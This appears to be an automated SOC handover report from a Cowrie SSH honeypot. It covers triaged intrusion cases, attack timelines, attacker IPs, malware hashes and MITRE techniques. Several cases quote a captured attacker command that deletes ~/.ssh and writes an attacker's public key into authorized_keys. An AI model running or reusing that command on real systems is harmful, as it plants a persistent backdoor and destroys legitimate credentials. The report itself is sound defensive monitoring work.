| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:06:02` | `cowrie.session.connect` |
| `2026-04-25 22:06:02` | `cowrie.client.version` |
| `2026-04-25 22:06:03` | `cowrie.client.kex` |
| `2026-04-25 22:06:04` | `cowrie.login.success` |
| `2026-04-25 22:06:05` | `cowrie.session.params` |
| `2026-04-25 22:06:05` | `cowrie.command.input` |
| `2026-04-25 22:06:05` | `cowrie.command.failed` |
| `2026-04-25 22:06:05` | `cowrie.log.closed` |
| `2026-04-25 22:06:06` | `cowrie.session.params` |
| `2026-04-25 22:06:06` | `cowrie.command.input` |
| `2026-04-25 22:06:06` | `cowrie.session.file_download` |
| `2026-04-25 22:06:06` | `cowrie.log.closed` |
| `2026-04-25 22:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e11088ec692

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:06 |
| **Last Seen** | 2026-04-25 22:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:06:10` | `cowrie.session.connect` |
| `2026-04-25 22:06:10` | `cowrie.client.version` |
| `2026-04-25 22:06:10` | `cowrie.client.kex` |
| `2026-04-25 22:06:12` | `cowrie.login.success` |
| `2026-04-25 22:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cad9042ff5b

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:08 |
| **Last Seen** | 2026-04-25 22:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:08:16` | `cowrie.session.connect` |
| `2026-04-25 22:08:16` | `cowrie.client.version` |
| `2026-04-25 22:08:17` | `cowrie.client.kex` |
| `2026-04-25 22:08:18` | `cowrie.login.success` |
| `2026-04-25 22:08:19` | `cowrie.session.params` |
| `2026-04-25 22:08:19` | `cowrie.command.input` |
| `2026-04-25 22:08:19` | `cowrie.command.failed` |
| `2026-04-25 22:08:19` | `cowrie.log.closed` |
| `2026-04-25 22:08:20` | `cowrie.session.params` |
| `2026-04-25 22:08:20` | `cowrie.command.input` |
| `2026-04-25 22:08:20` | `cowrie.session.file_download` |
| `2026-04-25 22:08:20` | `cowrie.log.closed` |
| `2026-04-25 22:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6494efce9d7

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:08 |
| **Last Seen** | 2026-04-25 22:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:08:24` | `cowrie.session.connect` |
| `2026-04-25 22:08:24` | `cowrie.client.version` |
| `2026-04-25 22:08:24` | `cowrie.client.kex` |
| `2026-04-25 22:08:26` | `cowrie.login.success` |
| `2026-04-25 22:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4289fa88730

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:09 |
| **Last Seen** | 2026-04-25 22:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:09:23` | `cowrie.session.connect` |
| `2026-04-25 22:09:23` | `cowrie.client.version` |
| `2026-04-25 22:09:24` | `cowrie.client.kex` |
| `2026-04-25 22:09:25` | `cowrie.login.success` |
| `2026-04-25 22:09:26` | `cowrie.session.params` |
| `2026-04-25 22:09:26` | `cowrie.command.input` |
| `2026-04-25 22:09:26` | `cowrie.command.failed` |
| `2026-04-25 22:09:26` | `cowrie.log.closed` |
| `2026-04-25 22:09:27` | `cowrie.session.params` |
| `2026-04-25 22:09:27` | `cowrie.command.input` |
| `2026-04-25 22:09:27` | `cowrie.session.file_download` |
| `2026-04-25 22:09:27` | `cowrie.log.closed` |
| `2026-04-25 22:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd33baf8174

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:09 |
| **Last Seen** | 2026-04-25 22:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:09:31` | `cowrie.session.connect` |
| `2026-04-25 22:09:31` | `cowrie.client.version` |
| `2026-04-25 22:09:31` | `cowrie.client.kex` |
| `2026-04-25 22:09:33` | `cowrie.login.success` |
| `2026-04-25 22:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7656d16ab5b4

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:11 |
| **Last Seen** | 2026-04-25 22:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:11:32` | `cowrie.session.connect` |
| `2026-04-25 22:11:32` | `cowrie.client.version` |
| `2026-04-25 22:11:32` | `cowrie.client.kex` |
| `2026-04-25 22:11:34` | `cowrie.login.success` |
| `2026-04-25 22:11:34` | `cowrie.session.params` |
| `2026-04-25 22:11:34` | `cowrie.command.input` |
| `2026-04-25 22:11:34` | `cowrie.command.failed` |
| `2026-04-25 22:11:35` | `cowrie.log.closed` |
| `2026-04-25 22:11:35` | `cowrie.session.params` |
| `2026-04-25 22:11:35` | `cowrie.command.input` |
| `2026-04-25 22:11:36` | `cowrie.session.file_download` |
| `2026-04-25 22:11:36` | `cowrie.log.closed` |
| `2026-04-25 22:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0163aa0bc0cf

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:11 |
| **Last Seen** | 2026-04-25 22:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:11:40` | `cowrie.session.connect` |
| `2026-04-25 22:11:40` | `cowrie.client.version` |
| `2026-04-25 22:11:40` | `cowrie.client.kex` |
| `2026-04-25 22:11:41` | `cowrie.login.success` |
| `2026-04-25 22:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d081447972

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:14 |
| **Last Seen** | 2026-04-25 22:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:14:47` | `cowrie.session.connect` |
| `2026-04-25 22:14:47` | `cowrie.client.version` |
| `2026-04-25 22:14:47` | `cowrie.client.kex` |
| `2026-04-25 22:14:48` | `cowrie.login.success` |
| `2026-04-25 22:14:49` | `cowrie.session.params` |
| `2026-04-25 22:14:49` | `cowrie.command.input` |
| `2026-04-25 22:14:49` | `cowrie.command.failed` |
| `2026-04-25 22:14:49` | `cowrie.log.closed` |
| `2026-04-25 22:14:50` | `cowrie.session.params` |
| `2026-04-25 22:14:50` | `cowrie.command.input` |
| `2026-04-25 22:14:51` | `cowrie.session.file_download` |
| `2026-04-25 22:14:51` | `cowrie.log.closed` |
| `2026-04-25 22:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15f10cd611a

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:14 |
| **Last Seen** | 2026-04-25 22:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:14:54` | `cowrie.session.connect` |
| `2026-04-25 22:14:54` | `cowrie.client.version` |
| `2026-04-25 22:14:55` | `cowrie.client.kex` |
| `2026-04-25 22:14:56` | `cowrie.login.success` |
| `2026-04-25 22:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4ebf61e70e

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:15 |
| **Last Seen** | 2026-04-25 22:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:15:53` | `cowrie.session.connect` |
| `2026-04-25 22:15:53` | `cowrie.client.version` |
| `2026-04-25 22:15:53` | `cowrie.client.kex` |
| `2026-04-25 22:15:54` | `cowrie.login.success` |
| `2026-04-25 22:15:55` | `cowrie.session.params` |
| `2026-04-25 22:15:55` | `cowrie.command.input` |
| `2026-04-25 22:15:55` | `cowrie.command.failed` |
| `2026-04-25 22:15:56` | `cowrie.log.closed` |
| `2026-04-25 22:15:56` | `cowrie.session.params` |
| `2026-04-25 22:15:56` | `cowrie.command.input` |
| `2026-04-25 22:15:57` | `cowrie.session.file_download` |
| `2026-04-25 22:15:57` | `cowrie.log.closed` |
| `2026-04-25 22:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6caa6b3a7dcc

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-04-25 22:16 |
| **Last Seen** | 2026-04-25 22:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 22:16:01` | `cowrie.session.connect` |
| `2026-04-25 22:16:01` | `cowrie.client.version` |
| `2026-04-25 22:16:01` | `cowrie.client.kex` |
| `2026-04-25 22:16:02` | `cowrie.login.success` |
| `2026-04-25 22:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `201.186.40[.]250` | **27** | 2026-04-25 21:39 | 2026-04-25 22:21 | 1m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.227.75[.]197` | 1 | 2026-04-25 21:41 | 2026-04-25 21:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-04-25 20:46 | 2026-04-25 20:47 | 62s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.139[.]244` | 1 | 2026-04-25 21:35 | 2026-04-25 21:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `184.101.31[.]126` | 1 | 2026-04-25 21:57 | 2026-04-25 21:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.153.136[.]231` | 1 | 2026-04-25 21:46 | 2026-04-25 21:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.85.226[.]199` | 1 | 2026-04-25 22:02 | 2026-04-25 22:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `95.85.226[.]199` | NL | 1Cent Host | **100** ⚠️ | 3 |
| `106.227.75[.]197` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 10 |
| `120.241.79[.]66` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `120.48.139[.]244` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `201.186.40[.]250` | CL | Telefonica del Sur S.A. | **100** ⚠️ | 50 |
| `43.153.136[.]231` | JP | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 9 |
| `184.101.31[.]126` | US | CenturyLink Communications, LLC | **85** ⚠️ | 0 |
| `151.226.171[.]133` | GB | Sky UK Limited | **58** | 0 |
| `104.237.146[.]187` | US | Linode | **45** | 4 |
| `125.236.222[.]226` | NZ | SPARK NEW ZEALAND TRADING LIMITED | 19 | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 57 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 9 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 74 cases |
| Tool 34  | Credential Extractor        | ✅ 55 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (21.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 7 recon entry/entries in table (1 group(s) consolidating 27 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T22:41:53Z_
